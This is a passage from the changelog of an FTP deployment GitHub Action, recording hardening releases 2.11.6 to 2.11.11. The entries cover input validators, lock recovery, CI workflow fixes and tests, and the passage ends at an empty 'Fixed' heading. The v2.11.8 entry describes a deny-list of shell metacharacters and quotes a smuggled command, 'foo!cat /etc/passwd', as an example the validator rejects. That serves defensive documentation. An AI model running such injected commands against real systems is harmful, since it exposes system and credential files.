# Changelog

All notable changes to this project will be documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [2.11.11] - 2026-09-06

Hardening batch v2.11.11 (F2 audit round post-v2.11.10). Closes 5 issues with
code changes and re-confirms 12 already-fixed issues as stale. See PR #307 for
the detailed diff.

### Fixed

- **`Dockerfile` drops the dead `WORKDIR /app` directive (closes #205)** — neither `entrypoint.sh` nor `lib.sh` uses `cd` or any relative path; every `/app/*` reference is absolute (`. /app/lib.sh`, `cat /app/VERSION`, `ENTRYPOINT ["/app/entrypoint.sh"]`). `WORKDIR` is a metadata directive that does not create a layer, so image size is unchanged. ENTRYPOINT uses an absolute path; the runner invokes it the same way regardless of cwd. The single-line removal cleans up the only remaining Dockerfile-level hygiene drift from the v2.11.7 (#262) batch.
- **`ci.yml` hadolint comment for `tests/integration/Dockerfile.test-server` no longer mis-identifies DL3018 (closes #220)** — pre-fix, the comment claimed "DL3018 (pin apk versions) ... treat as info for now", but DL3018 is hadolint's `apt-get`-version-pinning rule and does NOT apply here (the test-server uses `apk add` with every package version pinned: `vsftpd=3.0.5-r3`, `lftp=4.9.3-r0`, `ca-certificates=20260611-r0` at `tests/integration/Dockerfile.test-server:101-104`; the production Dockerfile does the same). The `failure-threshold: error` below silently drops DL3018's warning-level finding as a side effect, so there is nothing to "fix" — the comment is now a line-anchored explanation of *why* the rule is currently silent and a forward-looking warning that DL3018 will start surfacing the moment a future maintainer adds an apt-get-using Dockerfile.
- **`release.yml` ECR Public SBOM attestation step is commented out (closes #216)** — the active step was unreachable in practice because the ECR Public login steps earlier in the same job are already commented out and `ecr_enabled` resolves to `false` in every normal release. The step is now commented out with a `DISABLED:` preamble matching the existing ECR-login commented block, and the adjacent login-block preamble updated to reference three commented sites (login ×2, cosign-sign ECR branch, SBOM attestation) instead of one. The re-enable diff stays a one-step uncomment when the IAM trust policy is rewritten (tracked in #212). The `ecr_enabled` / `ecr_image` outputs emitted by the meta step remain wired so a future operator can verify the re-enable works end-to-end without rewiring.
- **`extract_netrc_host` coverage now includes the IPv6 zone-id form and path-prefix combinations (closes #182)** — added 4 bats tests to `tests/unit/parse.bats` after the existing `extract_netrc_host` block (`ftp://host/path?query`, `ftp://host/path#frag`, `ftp://user:pw@host/path`, `ftps://[fe80::1%25eth0]/path`). The zone-id case (RFC 6874 `%25`-encoded) was the genuinely missing input: `%` is not a sed metacharacter inside a `[...]` character class, so the existing regex preserves it correctly — the test pins that behaviour mechanically. The other three cases are belt-and-braces coverage; the production behaviour is already correct, but pinning it makes a future sed-regex regression fail loudly.
- **`start_ftp_server` / `start_ftps_server` defensively validate the FTP port globals (closes #166)** — added a 3- or 4-line `case` pattern check at the top of each helper (matching `lib.sh::validate_int`'s shape) for `FTP_CONTROL_PORT` / `FTP_IMPLICIT_PORT` / `FTP_PASV_MIN_PORT` / `FTP_PASV_MAX_PORT`. The variables are double-quoted in every use site and reach `${RUNTIME}` as opaque strings — POSIX sh does not word-split / glob-expand double-quoted parameter expansions and the container's `/bin/sh` never sees them, so this is NOT a security fix; it is a strict-improvement `log_fail` that surfaces a misconfigured harness (e.g. shell metacharacters in a config file) instead of letting the next scenario fail with a confusing "bind: invalid port" / "no port :// in URL" error.

### Audit backlog (closed stale — no behaviour change)

The following issues were re-confirmed as already-fixed on `main` at v2.11.10 (commit `37c3f35`) by the v2.11.11 audit subagent swarm and are closed as stale — no code change is required:

- **#164** (concurrency_lock doc drift in action.yml / README) — fixed by v2.11.3 PR #245 (`CHANGELOG.md:155, 238`); grep for `quote MKD|inline-lftp` returns zero matches across the repo.
- **#193** (`run_lftp_once` lftp log truncated on each retry) — fixed by v2.11.9 PR #302 (`lib.sh:1102` uses `>>`; `CHANGELOG.md:68`).
- **#198** (`concurrency_lock_poll_interval` description missing the `> 0` restriction) — fixed by v2.11.9 PR #302 (`action.yml:124-127` documents the constraint; `entrypoint.sh:185-194` enforces it; `tests/smoke.sh:698-707` regression-guards it).
- **#203** (Dockerfile three RUN layers could be combined) — only two RUNs remain after v2.11.7 PR #281 (`CHANGELOG.md:144`); combining the `apk add` and `echo $VERSION` RUNs would re-introduce the apk-index race #135 closed.
- **#224** (scenario 09 `sleep 1` for bind-mount propagation) — replaced by a 100ms-granularity deterministic visibility poll in v2.11.9 PR #302 (`tests/integration/scenarios/09-concurrency-lock-e2e.sh:147-176`).
- **#225** (`_log` files leaked on failure path) — every scenario (01/02/03/04/05/07/08/09/10/11/12) now registers `${_log:-}` in its EXIT trap; hardened by v2.11.10 PR #305 (`CHANGELOG.md:74-75`).
- **#226** (`_script` files leaked on failure path) — the three lftp-script scenarios (01/02/05) now register `${_script:-}` in their EXIT trap; same v2.11.9 / v2.11.10 batch.
- **#228** (lint target missing `tests/release-smoke.sh`) — `Makefile:88` includes it; closed by v2.11.9 PR #302 (`CHANGELOG.md:70`).
- **#229** (scenario 10 sentinel date hardcoded) — replaced by a POSIX-awk dynamic stamp in v2.11.9 PR #302 (`tests/integration/scenarios/10-stale-lock-recovery.sh:87-117`).
- **#232** (scenarios 03/04 missing `_log` cleanup comment) — both scenarios now document and implement the EXIT-trap cleanup (`tests/integration/scenarios/03-ftps-explicit-upload.sh:37-43,95-113`; `04-ftps-implicit-upload.sh:46-52,93-108`).
- **#235** (CHANGELOG.md missing v2.11.0/v2.11.1 link-references) — footer already includes `[2.11.2]`, `[2.11.1]`, `[2.11.0]` references (`CHANGELOG.md:1200-1202`); closed by `7289ebf`.
- **#133** (scenarios leak `INPUT_PASSWORD` through podman argv) — closed by commit `2627109` (`tests/integration/lib/common.sh:352-421` env-file + `chmod 0600`; `Makefile:247-260` `--env-file` instead of `-e`; `CHANGELOG.md:265`).

EPIC trackers also touched (no closure — they remain open as the audit-round deliverable, not a single release):

- **#233** ([EPIC] tests hardening audit) — sub-issues closed by the v2.11.9 / v2.11.10 hardening batches.
- **#241** ([EPIC] docs hardening audit) — sub-issues closed by v2.11.3 / v2.11.9 / v2.11.10 batches.
- **#280** ([EPIC] hardening batch — docs drift, build cleanup, validation tighten) — sub-issues closed by v2.11.10 PR #305 (`CHANGELOG.md:47-55`).
- **#285** ([EPIC] tests hardening batch v2.11.9) — sub-issues closed by v2.11.9 PR #302 (`CHANGELOG.md:93-99`).

## [2.11.10] - 2026-09-06

Workflows / `lib.sh` / tests / docs hardening batch (EPIC #304,
PR #305). Closes the F2 audit findings filed against v2.11.9.

### Fixed

- **`acquire_lock_with_recovery` now honors the documented `INPUT_CONCURRENCY_LOCK_TIMEOUT` (closes #294)** — pre-fix, the loop ran `ceil(timeout/poll)` iterations, each accumulating ~1-3s of MKD+LIST+RMD+sleep work, so total wall-clock was 1.4×–2× the documented value. Replaced iteration-counting with a POSIX `date +%s`-based wall-clock deadline check at the top of every iteration. `timeout=0` keeps its documented "no waiting, fail immediately" semantic. Worst-case overshoot is now one iteration's worth of MKD+LIST+RMD+sleep (~55s on a stuck server); 32-bit `$((...))` overflow for absurdly large timeouts is documented in the comment.
- **`extract_netrc_host` no longer silently corrupts the `.netrc` for malformed bracketed IPv6 URLs (closes #295)** — pre-fix, `ftp://[::1` (typo) passed `validate_path`, then `extract_netrc_host`'s regex produced empty output, then `write_netrc` emitted `machine  login user password` (invalid `.netrc`) and the user saw a confusing `530 Login authentication failed` downstream. Added a `[` / `]` count-balance check to `validate_path`; unbalanced brackets now exit 2 with `unbalanced IPv6 brackets (found N "[" and M "]")`.
- **Scenario 05 `INPUT_EXCLUDE` coverage is now load-bearing (closes #297)** — pre-fix, the `assert_absent local.bak` after the mirror was vacuous because the fixture carried no `.bak` file (it was inherited from a prior fixture layout). Added `tests/integration/fixtures/sample-public-html/local.bak` and updated the test to invoke the same `mirror -x '.*\.bak'` flag the action uses (the prior `set mirror:exclude` form is a silent no-op in lftp 4.9.3). The assertion now actually proves the upload-time `-x` flag is wired end-to-end; scenario 11's `INPUT_EXCLUDE_DELETE` (`-X`) coverage remains separate.
- **Scenario 09's deterministic visibility poll fails loudly instead of silently giving up (closes #298)** — pre-fix, when the 5-second poll expired without the lock dir being visible to vsftpd, the test continued and step 2's `assert_action_success` could pass for the wrong reason (action took a fresh lock, not a stale one). Now `log_fail "lock dir not visible to vsftpd within 5s; bind-mount propagation stalled"` on poll expiry so a real bind-mount stall surfaces as a red test, not a false-positive PASS.
- **SECURITY.md / CHANGELOG.md / README.md version stamps cannot drift again (closes #299)** — pre-fix, the SECURITY.md "latest = vX.Y.Z" stamp silently went stale every release (recurring drift of #234). Added a mechanical version-stamp drift check to `tests/contract.sh` that compares `VERSION` against the SECURITY.md line 7 stamp AND the top `## [X.Y.Z]` heading in CHANGELOG.md. README.md is checked defensively (no stamp today; added later it must match). A drifted stamp now fails CI on the next release branch instead of being caught by a future F2 audit.

### Security

- **`actions/checkout` no longer persists the auto-injected `GITHUB_TOKEN` to `.git/config` (closes #292)** — pre-fix, 7 of 7 ci.yml checkouts AND the release.yml build job's SHA-pinned checkout left `persist-credentials` at its default of `true`. The two release.yml verify jobs already set `persist-credentials: false`; consistency across all 10 sites closes a defense-in-depth gap (the token in `.git/config` is read-write scoped to the repo and can be reached by any subsequent `git push` invocation, even if no such invocation exists today).
- **README `@v2` floating alias is dead; every example now pins a specific tag (closes #289)** — pre-fix, README documented `@v2` as "always points to the latest v2.x release" but the release pipeline never moves the major alias (it still points at commit `2920f30` from 2026-07-05 — `git tag --contains` lists `v2.0.1`–`v2.6.0`). Users following the documented pin silently ran a v2.0.x-era image missing every fix between v2.1.0 and the present (notably v2.11.3 CRITICAL RCE fix, the v2.11.0 HOME/netrc fix, v2.11.6 lock hardening, and the v2.11.7 / v2.11.8 input-validator batch). Every README example now pins `@v2.11.9`. SECURITY.md floating-refs paragraph updated to call out `@v2` alongside `@latest`, `@master`, `@main`. (The `@v2.11.10` bump for the next release's examples is tracked as a follow-up doc-update PR.)
- **`upload_log_on_failure` is now honestly documented as BROKEN (closes #290)** — pre-fix, action.yml and README promised the action uploads the lftp log to the workflow run on exit 1 via an auto-upload to `${GITHUB_API_URL}/repos/.../actions/runs/.../artifacts`. GitHub's REST artifacts API has no create/POST endpoint; the call always returns non-2xx, the action logs `WARNING: failed to upload log artifact`, and the user never sees an artifact. The feature has been silently broken since v2.7.0 and is now marked BROKEN in both action.yml and README. README documents the supported manual replacement using `outputs.log_file` + a follow-up `actions/upload-artifact` step (with the caveat that the path is in-container and requires a host volume mount to survive).
- **SECURITY.md tag-signing table now reflects the actual record (closes #291)** — pre-fix, the table said "v2.11.0 and later" = SSH, but v2.11.7 and v2.11.8 were signed with PGP. The corrected table shows `v1.5.0–v2.10.0` PGP, `v2.11.0–v2.11.6` SSH, `v2.11.7–v2.11.8` PGP, `v2.11.9+` SSH, and the `.asc` is **not** optional today (the maintainer alternates between the two backends and both keys are load-bearing for at least one shipped release). AGENTS.md "Tag signing" table and "Tag signature guard" prose updated to match.
- **`dockerhub_image` namespace no longer hardcodes the maintainer's handle (closes #287)** — pre-fix, `release.yml:385` set `dockerhub_image="docker.io/airvzxf/ftp-deployment-action"` regardless of the workflow's `github.repository_owner`, so a fork that has `DOCKERHUB_USERNAME`/`DOCKERHUB_TOKEN` configured would silently push to the original maintainer's `docker.io/airvzxf/…` namespace. Now derived from `${owner}` (the same `owner="${{ github.repository_owner }}"` variable ghcr.io already used). The ECR Public namespace (`m2z1h0m9`) stays hardcoded with a comment explaining why (per-account AWS ID, not GitHub owner).
- **README ECR re-enable recipe now matches `release.yml` (closes #300)** — pre-fix, the recipe told operators to "change the `if false; then` line to `if [ -n "${AWS_ROLE_TO_ASSUME}" ]; then`", but v2.11.4 (#217) replaced the `if false; then` gate with `if [ -n "${ECR_DISABLED_FORCE:-}" ] && [ -n "${AWS_ROLE_TO_ASSUME}" ]` at `release.yml`. The README recipe now documents the actual `ECR_DISABLED_FORCE` opt-in switch and the IAM trust-policy repair it pairs with. The IAM Resource ARN was also corrected to drop the bogus `m2z1h0m9/` registry alias (`arn:aws:ecr-public::<account>:repository/<name>` does not carry a registry alias).

### Workflow

- **`:latest` assertion in the pre-release guard now scopes to the parsed `tags` list (closes #288)** — pre-fix, `release.yml:480` greps the **entire** `$GITHUB_OUTPUT` file for `:latest` (defense-in-depth for the v2.11.9 #275 fix). Today no metadata value contains `:latest` so the assertion passes, but any future maintainer adding a `:latest` substring to an unrelated output value (e.g. `latest_supported=…`) would false-positive, AND a regression that put `:latest` into a metadata field rather than `all_tags` could slip past. Replaced with `printf '%s\n' "${tags}" | grep -Fxq -e "${image}:latest"` — full-line, fixed-string, scoped to the parsed tags variable.
- **Empty `body_path` ternary in `publish` no longer confuses `softprops/action-gh-release` (closes #293)** — pre-fix, when the build step didn't find a CHANGELOG section, `body_path: ${{ body-empty != 'true' && 'release/CHANGELOG.body.md' || '' }}` resolved to `''`, which the action interpreted as the cwd and tried to read `body.md` from there (failing), then escalated via `fail_on_unmatched_files: true` into a misleading publish failure. Refactored the publish-meta step to emit the body content via a heredoc (`body<<EOF…EOF`) and switched the action invocation from `body_path` to `body`. `fail_on_unmatched_files` is now conditional: true when a body IS expected (so a missing SBOM still fails), false on the empty-body path (so the SBOM-missing failure mode doesn't shadow the `generate_release_notes` fallback).

### Documentation

- **README validation / exit-code docs now cover v2.11.7 and v2.11.8 changes (closes #301)** — pre-fix, the exit-codes table's `2` row mentioned only `local_dir` / `remote_dir` and the `lftp_settings` denylist; the Settings preamble said nothing about the canonical boolean spellings. The new row adds `server` validation, URL-userinfo-with-embedded-password rejection (v2.11.8 #195 closes the `.netrc`-bypass), ASCII space (v2.11.8 #174), leading zeros (v2.11.7 #253), the canonical boolean set (`true|false|yes|no|on|off|0|1`, anything else exits 2; v2.11.7 #252), and the `exclude` / `exclude_delete` `validate_glob_pattern` rejects. The Settings preamble now documents the boolean spellings and the leading-zero rejection explicitly. The Security section's path-validation prose now covers `server` and `concurrency_lock_path` alongside `local_dir` / `remote_dir`, with the URL-userinfo rejection and the ASCII-space guard called out.

### Excluded

- **#296** — `pending-design`. The right fix depends on what
  `upload_log_on_failure` is meant to deliver (last attempt only? full
  retry history? first failure only?). README now reflects the broken
  state honestly (see #290 above); the architectural redesign tracks
  with this issue.

### Validation

- `make lint` (shellcheck + actionlint + hadolint): clean.
- `make contract`: 5/5 ok (31 inputs match; SECURITY.md / CHANGELOG.md /
  README.md stamps match VERSION).
- `make unit`: 203/203 passing (was 197 in v2.11.9, +1 for #294, +5 for #295).
- `make smoke`: all smoke tests pass.
- `tests/integration` (all 11 scenarios): PASS — including the now-
  load-bearing scenario 05 INPUT_EXCLUDE coverage.

F2 audit batch: 16 issues filed (#286–#301), 15 closed in this release
(#296 deferred per `pending-design`).

## [2.11.9] - 2026-09-06

Test infrastructure hardening batch (EPIC #285). Closes the test-side
findings from the v2.11.x audit arc; production-side hardening already
shipped in v2.11.8.

### Fixed

- **`run_lftp_once` retry log is appended, not overwritten (closes #193)** — `lib.sh:1074` switches the log redirect from `>` to `>>` so retries preserve history. Pre-fix, each retry erased the previous attempt's output; the post-mortem log only contained the LAST attempt's stderr (or nothing if every attempt failed mid-startup). One-character change.
- **`action.yml` documents the `> 0` restriction for `INPUT_CONCURRENCY_LOCK_POLL_INTERVAL` (closes #198)** — the input was already validated by `lib.sh::validate_int` to reject `0`, but the description claimed `default: "10"` without calling out the `> 0` constraint. README / docs parity restored; no behaviour change.
- **`Makefile` lint target now covers `tests/release-smoke.sh` (closes #228)** — the post-build smoke check was missing from the `shellcheck -x` invocation, so `make lint` could not catch a regression in that file. CI was unaffected (its own lint path is exhaustive); local dev is now consistent with CI.

### Tests

- **Integration scenarios register `_log` / `_script` / `_env` in the EXIT trap (closes #225, #226, #232)** — eleven scenarios (`01, 02, 03, 04, 05, 07, 08, 09, 10, 11, 12`) now remove the tempfiles on EVERY exit path (success, lftp error, assertion failure, signal). Pre-fix, only the success branch cleaned up; failure paths leaked tempfiles until the host's `/tmp` GC fired. The header in scenarios 03 and 04 documents the cleanup behaviour.
- **F2 audit: `${_env:-}` / `${_log:-}` defaults on every trap variable (closes #225 F2 audit)** — the EXIT trap is installed BEFORE `_log` / `_env` are assigned. Under `set -u`, a bare `${_log}` would abort the entire trap string before `stop_ftp_server` runs, leaking the FTP container on the host. `${VAR:-}` defaults restore the trap-safe contract across all eleven action-driven scenarios.
- **Integration scenarios assert the `assets/` subdirectory landed on the server (closes #165)** — the FTPS scenarios (`03`, `04`) and the bare-host action-driven scenario (`08`) were uploading files but never asserting `assets/` arrived. The plain FTP scenarios (`01`, `02`, `05`, `09`, `10`, `11`, `12`) already covered it; this closes the symmetric gap.
- **`tests/integration/scenarios/05` drops the NULL `local.bak` assertion (closes #165)** — the assertion checked for a filename that did not exist on either source or destination. Residual `INPUT_EXCLUDE` end-to-end gap is documented in the scenario header (scenario 11 covers `INPUT_EXCLUDE_DELETE`; scenario 05 stays as the lftp-primitive smoke test).
- **`tests/integration/scenarios/09` replaces `sleep 1` with a deterministic visibility poll (closes #224)** — the bind-mount propagation wait was a fixed 1-second sleep, fragile against slower runners. Now a 200 ms-granularity poll against the FTP container with a 5-second budget.
- **`tests/integration/scenarios/10` makes the stale sentinel timestamp dynamic (closes #229)** — was a hardcoded `2026-01-01` literal, would drift on long-lived CI runners and become ambiguous in future years. Now derived from `now - 2 × INPUT_CONCURRENCY_LOCK_TIMEOUT`. Also closes the F2 audit finding that hardcoded `900` in two unrelated places — the staleness window is now read from the same `_tlock_timeout` variable passed to the env file.

### Stale-issue cleanup

These pre-existing fixes needed their GitHub state closed (no code change
required for any of them):

- #191 (GITHUB_OUTPUT abort on echo failure) — already fixed in `entrypoint.sh:422`; closed.
- #195 (INPUT_SERVER userinfo bypass) — closed by v2.11.8 #190 fix.
- #257 (print_inputs_dump order) — closed by v2.11.8 #181 fix.
- #227 (stale '24 declared inputs' comment) — closed by v2.11.8 #181 fix.
- #204 (COPY layers) — already combined in trunk.
- #221 (concurrency group key without default) — already fixed in trunk.

### Validation

- `make lint` (shellcheck + actionlint + hadolint): clean.
- `make contract`: 31 inputs match.
- `make unit`: 197 / 197 passing.
- `make smoke`: 46 / 46 passing.
- `tests/integration` (all 11 scenarios): PASS.

F2 audit batch: 16 new issues filed (#286-#301) covering workflows,
docs, `lib.sh`, and tests — separate EPIC will be filed if the volume
warrants it.

## [2.11.8] - 2026-09-05

### Security

- **`INPUT_SERVER` is now validated and rejects URL userinfo with embedded password** (closes #190, #195) — `INPUT_SERVER` flowed verbatim into three lftp invocations and `extract_netrc_host`, with no validator in front. Three hardening steps in `entrypoint.sh`:
  * `validate_path "server" "${INPUT_SERVER}"` — the same deny-list (`;|&`` $`, `!`, `"`, `..`, leading dash, control chars, newlines, and (v2.11.8) ASCII space) that already guards `INPUT_LOCAL_DIR`, `INPUT_REMOTE_DIR`, and `INPUT_CONCURRENCY_LOCK_PATH`. Valid FTP / FTPS / bracketed-IPv6 URLs all pass; shell-metacharacter payloads are rejected with exit 2 before any `.netrc` is written.
  * URL userinfo with embedded password is rejected: `INPUT_SERVER=ftp://deploy:plaintext@example.com/` (the `*://*:*@*` shape) now exits 2 with a precise error. lftp 4.9.3 parses the userinfo and authenticates with the embedded credentials, silently bypassing the action's `.netrc`-based credential path. Bare `ftp://user@host` (no `:` between the userinfo's `://` and `@`) is the legitimate pattern used by `tests/integration/scenarios/03-ftps-explicit-upload.sh` and `04-ftps-implicit-upload.sh`, where the username must live in the URL so lftp's netrc lookup fires; this check intentionally allows that shape.
  * `extract_netrc_host` strips `?query` and `#fragment` segments (closes #185). URLs like `ftp://example.com?token=abc` previously returned the entire string for the `.netrc` lookup, breaking it for legitimate URLs with query / fragment.

### Fixed

- **`validate_path` rejects ASCII space** (closes #174) — `remote_dir: /my data/site/` previously tokenised as `cd /my` + leftover `data/site/` inside the `lftp -e` body. The new case-based check runs *after* the `!` lftp-shell-escape check so a combined payload like `foo!cat /etc/passwd` still surfaces the more-precise `!` error first. All integration fixtures use space-free paths; the check is a strict improvement (loud failure beats silent breakage).
- **`compute_backoff_seconds` no longer depends on `$RANDOM`** (closes #179) — the busybox-ash `$RANDOM` extension is unset on a strict POSIX `/bin/sh` (dash on Debian), which would collapse the jitter to zero and fire every retry at the same instant. Replaced with the POSIX-portable `awk -v n=… 'BEGIN { srand(); printf "%d", int(rand() * (n + 1)) - int(n / 2) }'` pattern already idiomatic in `tests/integration/lib/common.sh:106`. The `-d/2 ... +d/2` symmetric jitter range (and the four existing `tests/unit/retry.bats` range tests) are unchanged.
- **`print_resolved_config` is now gated by `INPUT_DEBUG=true`** (closes #194) — the function previously dumped `INPUT_LOCAL_DIR`, `INPUT_REMOTE_DIR`, `FTP_SETTINGS`, `MIRROR_COMMAND`, `INPUT_MAX_RETRIES`, and a recursive `ls -lha` of the local directory on every run regardless of debug. Default `INPUT_DEBUG` is `"false"`; the dump is now visible only when the operator explicitly opts in. New smoke test pins the contract (`INPUT_DEBUG=false` does NOT emit a `Resolved configuration` group).
- **`print_inputs_dump` order matches `action.yml` and the debug=true printf block is complete** (closes #181, #257, #227) — two issues closed in one fix:
  * Reordered the `delete` and `max_retries` printf lines so a side-by-side diff of the debug dump against `action.yml`'s `inputs:` block is clean (action.yml declares `delete` before `max_retries`; the previous block had them swapped).
  * Added the two missing entries to the `debug=true` printf block: `fail_on_deprecated` and `dry_run` (the block had 29 entries while the `debug=false` for-loop iterated 31). A regression that drops either from the printf block would have slipped past `tests/contract.sh` (which only audits the for-loop) and past the existing `report.bats` test (which only covered the `debug=false` branch).
  * Extended the `report.bats:94` test to cover all 31 declared inputs and updated the misleading "24 declared inputs" comment.
- **`acquire_lock_with_recovery` RMDs the lock dir on MKD-success + PUT-failure** (closes #254) — pre-fix, a transient sentinel-PUT failure inside the MKD-success branch continued the loop without cleaning up. `ACQUIRED_LOCK_SENTINEL` was never set, so `release_lock_safely`'s post-#188 no-sentinel guard would short-circuit, leaving the lock dir behind until a later runner's stale-recovery branch RMD'd it. New 10s-timeout `quote RMD` best-effort before `continue`, mirroring the recovery branch's `set +e` / `>/dev/null 2>&1` swallow semantics.
- **`build_ftp_settings` drops a dead leading-space strip** (closes #258) — the always-empty leading whitespace the strip was protecting cannot exist: the first iteration of the while loop unconditionally appends `set ftp:ssl-allow …;`, so `_bfs_settings` always starts with `s`. `tests/unit/parse.bats:119-131` already asserts the first character is `s`, which mechanically proves the strip is a no-op. Cosmetic; no behaviour change.
- **`run_lftp_once` no longer threads two permanently-empty lock arguments** (closes #259) — `LOCK_ACQUIRE` / `LOCK_RELEASE` have been unconditional no-op shims since v2.9.0 (lock work moved to `acquire_lock_with_recovery` / `release_lock_safely`). The two positional arguments (positions 9 and 10 of the old 11-arg signature) were concatenated as empty strings into the lftp script body. Dropped from `run_lftp_once`, `entrypoint.sh`, and the `run_init`-style smoke harness. The two `build_lock_*_script` helpers stay in `lib.sh` as no-ops for source-level backward compat.

### Validation

- `make lint` (shellcheck + actionlint + hadolint): clean.
- `make contract`: 31 inputs match (dump loop's name list now agrees with `action.yml`).
- `make unit`: 197 / 197 passing (was 183 + 14 new for #174, #185, #181, #257, #227, #179; one test for #172 inverted after review: `validate_lftp_settings` legitimately allows `"` because `action.yml:85` documents `set http:user-agent "firefox";` as a happy path; the fix surface for #172 is `validate_path` and `validate_glob_pattern`, both of which already reject `"` since v2.11.3 / v2.11.3.1).
- `make smoke`: 47 / 47 passing.

## [2.11.7] - 2026-09-05

### Security

- **Boolean aliases (`yes`/`no`/`on`/`off`/`0`/`1`) now work for the 7 gate inputs** (closes #252) — `delete`, `no_symlinks`, `dry_run`, `upload_log_on_failure`, `concurrency_lock`, `debug`, and `fail_on_deprecated` were compared to the literal string `"true"`, so a workflow that wrote `concurrency_lock: yes` or `dry_run: True` was silently off. New `normalize_bool` helper in `lib.sh` validates through `validate_bool` (rejects RCE payloads and capitalised variants with exit 2) and canonicalises to `"true"` / `"false"` so the existing literal compares keep working. The 5 booleans that flow into the `lftp -e` body were already covered by `validate_bool` since v2.11.3 (#171); this closes the symmetric gap for the 7 gate booleans.
- **`validate_int` rejects leading zeros** (closes #253) — `00`, `007`, `08`, `09` now exit 2 with `"must be a non-negative integer without leading zeros"`. The string compare at `entrypoint.sh:358` (`max_retries != "0"`) silently broke the documented retry-forever sentinel when `max_retries=00`. The arithmetic at `lib.sh:1077` (lock-acquire count) crashed on `concurrency_lock_poll_interval=08` and divided-by-zero on `=00`. Single-line, single source of truth; the canonical `0` retry-forever sentinel is unaffected.

### Fixed

- **Dockerfile build hygiene** (closes #262 #208 #209) — three changes:
  * Consolidated two consecutive `RUN` instructions (`echo VERSION > /app/VERSION` + `chmod +x /app/entrypoint.sh`) into a single `RUN` (hadolint DL3059). Image layers reduced from 10 to 9.
  * Removed redundant `mkdir -p /home/lftp` + `chown -R lftp:lftp /home/lftp`. Busybox `adduser -h DIR` already creates the home dir; the `mkdir` / `chown` were no-ops on alpine:3.24.
  * Removed `COPY LICENSE README.md /app/`. Neither file is read at runtime by `entrypoint.sh` or `lib.sh`; ~76 KB and one image layer saved.
- **Makefile recipes work from any subdirectory** (closes #269) — the `ROOT := $(abspath $(dir $(lastword $(MAKEFILE_LIST))))` variable declared at `Makefile:15` was unused; `build`, `build-test-server-image`, `build-smoke-image`, and `run` all used CWD-relative paths (`docker build .`, `tests/integration`, `$(PWD)`). Wired `$(ROOT)` into all four recipes with quoted variable substitutions. CI is unaffected (runs from repo root).
- **`.dockerignore` tightened** (closes #262 #206) — added `.worktrees`, `tests`, `scripts`, `Makefile`, `action.yml`, `CHANGELOG.md`, `AGENTS.md`, `ROADMAP.md`, `SECURITY.md`. ~570 KB of leaked build-context removed; `make build` and `docker build .` no longer ship docs / tests / scripts to the daemon.
- **Test-harness parity fix** (closes #265) — `tests/integration/lib/common.sh::lftp_build_open_script` now applies `chmod 0600` to the lftp script file it writes. The script contains the synthetic test FTP password on the `open -u ${FTP_USER},${FTP_PASSWORD} ...` line; the #133 / #158 chmod was applied to the FTPS env-files but missed this path. Scenarios 01 / 02 / 05 use this helper.

### Documentation

- **`README.md` ASCII-art flow** (closes #239) — `@master` → `@main` on the deprecation-check step (default branch was renamed to `main`; the diagram is the only `@master` reference in the README).
- **`README.md` exclusion section** (closes #260) — 9 stale references to pre-v2.11.2 `set mirror:exclude` / `set mirror:exclude-file` / comma-separated glob prose rewritten to match the current `mirror -x` (POSIX ERE) / `mirror -X` (PatternSet::Glob) behaviour. The extended example's `exclude: "*.map,node_modules/**,.git/**"` was broken as POSIX ERE; replaced with the correct `.*\.map|node_modules/.*|\.git/.*`. The "Pattern exclusions" table's `exclude_delete` row was claiming delete-only behaviour (false since lftp 4.9.3 — both `-x` and `-X` apply to upload AND delete).
- **`README.md` concurrency-lock section** (closes #261) — 6 stale `quote MKD` / inline-`-e` references rewritten to the high-level `mkdir` (acquire) and `quote RMD` (release, intentional raw form). The flowchart row now describes `acquire_lock_with_recovery` (shell-driven, since v2.9.0) instead of `build_lock_acquire` (deprecated inline `-e` fragment).
- **`README.md` Security section** (closes #260) — listed the v2.11.3 hardening additions (`"`, `!`, newline) and called out that `exclude` / `exclude_delete` use the separate `validate_glob_pattern` validator (they are valid PatternSet / regex metacharacters and are NOT command separators for lftp's `-e` handler).
- **`CHANGELOG.md` v2.11.3 link reference** (closes #264) — PR #245 added `v2.11.0` and `v2.11.1` references but missed the `v2.11.3` line. Footer now descending `2.11.4 → 2.11.3 → 2.11.2 → 2.11.1 → 2.11.0`.

### Tests

- **`print_resolved_config` unit coverage** (closes #266) — `tests/unit/report.bats` header advertised coverage for `print_resolved_config` but had zero `@test` blocks. Added three tests covering the group markers, the `ls -lha` local listing, and the resolved-settings section.
- **Validation bats coverage** — 7 new tests covering `validate_int` leading-zero rejection (`00`, `007`, `08`, `09`) and `normalize_bool` canonicalisation (`yes`/`on`/`1` → `"true"`, `no`/`off`/`0`/`""` → `"false"`), capitalised-variant rejection, and RCE-payload rejection.

## [2.11.6] - 2026-09-05

### Security

- **`acquire_lock_with_recovery` no longer vandalises a healthy holder's lock dir under concurrency_lock** (closes #173 #176 #178 #184 #251 #268) — six related F2-audit findings share the same blast radius: a parallel runner DELEing or RMDing the live holder's sentinel / lock dir. The fix has three parts:
  * **Atomic recovery snapshot (#173, #176)** — the parser now returns every parsed sentinel, sorted ascending by stamp; the recovery branch builds ONE `lftp` script that lists the directory, DELEs every parsed sentinel, and RMDs the lock dir in the same control connection. A concurrent holder's PUT-in-progress that arrives between our `cls` and our first `quote DELE` survives — the desired behaviour, since that sentinel belongs to a live runner.
  * **Fail-fast timeout (#251)** — `concurrency_lock_timeout=0` short-circuits BEFORE the recovery branch; a MKD failure now returns 1 without LIST / DELE / RMD against the held lock dir.
  * **Respects transient LIST failures (#268)** — the LIST exit code is captured; on TCP reset / FTP 421 / 10s timeout the function backs off and retries instead of treating an empty listing as "no sentinel" and triggering takeover.
  * **Hardened tempfile (#178, #184)** — the `mktemp` fallback for the sentinel body now mixes in `/dev/urandom` entropy and `chmod 0600` unconditionally, so a busybox-without-mktemp runner can no longer leak a predictable, world-readable local path.
  * **Deterministic mktime-failure handling** — `_lock_age_seconds` now exits non-zero on POSIX `awk mktime` parse failure (corrupted sentinel with non-numeric components); the caller treats indeterminate ages as "lock held, back off" instead of producing a garbage age that could spuriously take over or respect the lock. Pre-fix this was data-dependent; post-fix the workflow either waits or fails fast deterministically.

### Fixed

